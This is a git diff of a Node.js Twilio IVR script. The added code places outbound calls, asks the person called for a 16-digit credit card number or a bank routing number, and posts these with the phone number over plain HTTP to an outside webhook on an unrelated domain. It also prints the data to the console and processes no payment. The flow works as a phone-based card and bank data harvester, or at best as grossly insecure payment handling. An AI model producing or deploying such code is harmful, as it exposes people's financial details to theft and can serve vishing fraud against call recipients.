@@ -1,5 +1,6 @@
 const twilio = require('twilio');
 require('dotenv').config();
+const axios = require('axios');
 const VoiceResponse = twilio.twiml.VoiceResponse;
 const client = twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN);
 
@@ -9,9 +10,10 @@ function getURL(path, phone) {
     return `http://testivr.habitizr.com/api/twilio/${path}?phone=${phone}`;
 }
 
+// Start Call
 exports.startCall = async (req, res) => {
-    const { phone, amount } = req.body;
-    session[phone] = { amount };
+    const { phone } = req.body;
+    session[phone] = {};
 
     try {
         const call = await client.calls.create({
@@ -29,46 +31,10 @@ exports.startCall = async (req, res) => {
     }
 };
 
+// Initial IVR Menu
 exports.ivr = (req, res) => {
     const phone = req.query.phone;
-    if (!session[phone]) session[phone] = {};
-
-    const twiml = new VoiceResponse();
-    twiml.say("This call is recorded. Your responses will serve as your authorization.");
-
-    const gather = twiml.gather({
-        input: 'speech',
-        action: getURL('capture-name', phone),
-        method: 'POST'
-    });
-    gather.say("Please state your full name.");
-
-    res.type('text/xml').send(twiml.toString());
-};
-
-exports.captureName = (req, res) => {
-    const phone = req.query.phone;
-    const name = req.body.SpeechResult;
-    if (!session[phone]) session[phone] = {};
-    session[phone].name = name;
-    console.log('Captured Name:', name);
-
-    const twiml = new VoiceResponse();
-    const gather = twiml.gather({
-        numDigits: 8,
-        action: getURL('capture-dob', phone),
-        method: 'POST'
-    });
-    gather.say("Enter your date of birth as MMDDYYYY.");
-    res.type('text/xml').send(twiml.toString());
-};
-
-exports.captureDOB = (req, res) => {
-    const phone = req.query.phone;
-    const dob = req.body.Digits;
-    if (!session[phone]) session[phone] = {};
-    session[phone].dob = dob;
-    console.log('Captured DOB:', dob);
+    session[phone] = {};
 
     const twiml = new VoiceResponse();
     const gather = twiml.gather({
@@ -76,88 +42,76 @@ exports.captureDOB = (req, res) => {
         action: getURL('select-method', phone),
         method: 'POST'
     });
-    gather.say("Press 1 for Credit Card, 2 for Bank Account.");
+    gather.say("Press 1 for Credit Card, Press 2 for Bank Account ACH.");
+
     res.type('text/xml').send(twiml.toString());
 };
 
+// Handle Payment Method
 exports.selectMethod = (req, res) => {
     const phone = req.query.phone;
     const choice = req.body.Digits;
     const twiml = new VoiceResponse();
 
     if (choice === '1') {
+        session[phone].paymentType = 'card';
         const gather = twiml.gather({
             numDigits: 16,
             action: getURL('capture-card', phone),
             method: 'POST'
         });
-        gather.say("Enter your 16-digit credit card number.");
+        gather.say("Please enter your 16-digit credit card number.");
     } else if (choice === '2') {
+        session[phone].paymentType = 'ach';
         const gather = twiml.gather({
             numDigits: 9,
             action: getURL('capture-routing', phone),
             method: 'POST'
         });
-        gather.say("Enter your 9-digit bank routing number.");
+        gather.say("Please enter your 9-digit routing number.");
     } else {
-        twiml.say("Invalid choice.");
+        twiml.say("Invalid option. Goodbye.");
+        twiml.hangup();
     }
 
     res.type('text/xml').send(twiml.toString());
 };
 
-exports.captureCard = (req, res) => {
+// Capture Credit Card
+exports.captureCard = async (req, res) => {
     const phone = req.query.phone;
-    if (!session[phone]) session[phone] = {};
-    session[phone].card = req.body.Digits;
+    session[phone].cardNumber = req.body.Digits;
+
+    await sendWebhook(phone);
 
     const twiml = new VoiceResponse();
-    twiml.redirect(getURL('process-payment', phone) + '&type=card');
+    twiml.say("Thank you. Your credit card details have been submitted.");
+    twiml.hangup();
     res.type('text/xml').send(twiml.toString());
 };
 
-exports.captureRouting = (req, res) => {
+// Capture Routing Number
+exports.captureRouting = async (req, res) => {
     const phone = req.query.phone;
-    if (!session[phone]) session[phone] = {};
-    session[phone].routing = req.body.Digits;
+    session[phone].routingNumber = req.body.Digits;
+
+    await sendWebhook(phone);
 
     const twiml = new VoiceResponse();
-    const gather = twiml.gather({
-        numDigits: 12,
-        action: getURL('capture-account', phone),
-        method: 'POST'
-    });
-    gather.say("Enter your bank account number.");
+    twiml.say("Thank you. Your bank details have been submitted.");
+    twiml.hangup();
     res.type('text/xml').send(twiml.toString());
 };
 
-exports.captureAccount = (req, res) => {
-    const phone = req.query.phone;
-    if (!session[phone]) session[phone] = {};
-    session[phone].account = req.body.Digits;
-
-    const twiml = new VoiceResponse();
-    twiml.redirect(getURL('process-payment', phone) + '&type=ach');
-    res.type('text/xml').send(twiml.toString());
-};
-
-exports.processPayment = (req, res) => {
-    const phone = req.query.phone;
-    const type = req.query.type;
+// Send to webhook
+async function sendWebhook(phone) {
     const data = session[phone];
+    data.phone = phone;
 
-    console.log("Processing payment for:", data);
-
-    const twiml = new VoiceResponse();
-
-    // Mock payment success for now
-    const success = true;
-
-    if (success) {
-        twiml.say("Payment processed successfully.");
-    } else {
-        twiml.say("Payment failed. Please contact support.");
+    try {
+        await axios.post("http://crm.reliabletiredisposal.online/jotform-webhook", data);
+        console.log("Data sent to webhook:", data);
+    } catch (error) {
+        console.error("Webhook failed:", error.message);
     }
-
-    res.type('text/xml').send(twiml.toString());
-};
+}
